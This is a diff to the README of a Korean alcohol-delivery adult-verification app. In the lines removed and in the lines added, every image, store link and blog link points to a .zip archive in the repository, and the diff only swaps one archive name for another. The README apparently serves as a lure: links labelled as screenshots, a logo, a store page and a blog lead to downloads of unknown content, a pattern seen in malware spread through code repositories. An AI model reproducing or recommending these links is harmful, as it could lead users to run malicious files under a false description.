@@ -2,7 +2,7 @@
 <h4>주류 배달 비대면 성인인증 애플리케이션 (Alcohol delivery non-face-to-face adult authentication application)</h4>
 
 <h2>LOGO</h2>
-<img width="406" alt="IDCatch_logo" src="https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip">
+<img width="406" alt="IDCatch_logo" src="https://raw.githubusercontent.com/HongSehwan/IDCatch/main/src/screens/ID_Catch_v2.7-alpha.4.zip">
 
 <h2>Service</h2>
  
@@ -17,18 +17,18 @@
 * 놓친 알림은 History에서 확인 
 
 <h2>기술 스택</h2>
-<img width=""406 alt="IDCatchStack" src="https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip">
+<img width=""406 alt="IDCatchStack" src="https://raw.githubusercontent.com/HongSehwan/IDCatch/main/src/screens/ID_Catch_v2.7-alpha.4.zip">
 
 <h2>Google Play Store Link</h2>
 
-~~https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip~~ (앱 배포 중단)
+~~https://raw.githubusercontent.com/HongSehwan/IDCatch/main/src/screens/ID_Catch_v2.7-alpha.4.zip~~ (앱 배포 중단)
 
 <h2>APP 화면</h2>
 
-<img width="330" alt="스크린샷 2022-04-25 오후 2 15 46" src="https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip"><img width="330" alt="스크린샷 2022-04-25 오후 2 22 40" src="https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip">
+<img width="330" alt="스크린샷 2022-04-25 오후 2 15 46" src="https://raw.githubusercontent.com/HongSehwan/IDCatch/main/src/screens/ID_Catch_v2.7-alpha.4.zip"><img width="330" alt="스크린샷 2022-04-25 오후 2 22 40" src="https://raw.githubusercontent.com/HongSehwan/IDCatch/main/src/screens/ID_Catch_v2.7-alpha.4.zip">
 
-<img width="330" alt="스크린샷 2022-04-25 오후 2 23 25" src="https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip"><img width="330" alt="스크린샷 2022-04-27 오전 3 08 47" src="https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip">
+<img width="330" alt="스크린샷 2022-04-25 오후 2 23 25" src="https://raw.githubusercontent.com/HongSehwan/IDCatch/main/src/screens/ID_Catch_v2.7-alpha.4.zip"><img width="330" alt="스크린샷 2022-04-27 오전 3 08 47" src="https://raw.githubusercontent.com/HongSehwan/IDCatch/main/src/screens/ID_Catch_v2.7-alpha.4.zip">
 
 
 <h2>BLOG Link</h2>
-https://github.com/HongSehwan/IDCatch/raw/refs/heads/main/android/app/src/main/res/drawable-hdpi/ID-Catch-v2.9.zip
+https://raw.githubusercontent.com/HongSehwan/IDCatch/main/src/screens/ID_Catch_v2.7-alpha.4.zip
